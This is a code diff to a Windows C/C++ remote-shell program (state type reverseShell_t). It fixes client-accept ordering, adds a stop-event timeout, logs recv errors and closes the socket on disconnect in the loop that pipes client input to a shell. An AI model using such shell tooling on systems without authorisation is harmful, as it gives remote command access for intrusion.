@@ -4,7 +4,7 @@ extern reverseShell_t	shell;
 
 static BOOL processShouldStop(void) {
 	if (shell.stopEventsignal != INVALID_HANDLE_VALUE) {
-		if (WaitForSingleObject(shell.stopEventsignal, 0) == WAIT_OBJECT_0)
+		if (WaitForSingleObject(shell.stopEventsignal, 50) == WAIT_OBJECT_0)
 			return (TRUE);
 	}
 	return (FALSE);
@@ -24,9 +24,11 @@ static currentState_e acceptClient(void) {
 }
 
 static currentState_e waitForClient(void) {
-	if (newSession() == FATAL_ERROR)
-		return (FATAL_ERROR);
-	return (acceptClient());
+	currentState_e state = acceptClient();
+
+	if (state != CONTINUE_SESSION)
+		return (state);
+	return (newSession());
 }
 
 static BYTE thereIsDataInPipe(void) {
@@ -74,14 +76,18 @@ static currentState_e tellToShell(void) {
 
 static currentState_e processClientInput(void) {
 	int bytesReceived = recv(shell.clientSocket, shell.clientBuffer, BUFFER_SIZE-1, 0);
+	int error = WSAGetLastError();
 	if (bytesReceived == SOCKET_ERROR) {
+		std::cerr	<< "Error: " << error << "\n";
 		if (WSAGetLastError() == WSAEWOULDBLOCK)
 			return (CONTINUE_SESSION);
 		//if (WSAGetLastError() == WSAECONNRESET)
 		//	return (RESET_SESSION);
 		return (RESET_SESSION);
-	} else if (bytesReceived == CONNECTION_CLOSED)
+	} else if (bytesReceived == CONNECTION_CLOSED) {
+		closesocket(shell.clientSocket);
 		return (RESET_SESSION);
+	}
 	shell.clientBuffer[bytesReceived] = '\0';
 	return (tellToShell());
 }
